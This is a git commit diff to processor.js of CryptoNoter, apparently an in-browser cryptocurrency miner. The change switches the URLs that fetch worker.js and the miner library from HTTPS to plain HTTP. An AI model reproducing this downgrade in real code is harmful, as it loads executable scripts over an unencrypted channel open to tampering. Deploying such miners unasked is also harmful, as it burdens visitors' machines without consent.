57b3f38b185193e0b45311ee45d6511c6c6f6b58
Mark Allen Evans <president@worldvaporexpo.com>
2018-01-15 17:22:42 -0500

    Update processor.js

--- web/processor.js
+++ web/processor.js
@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
+            xhr.open("get", "http://%CryptoNoter_domain%/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
+    LIB_URL: "http://%CryptoNoter_domain%/lib/",
     WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
 };
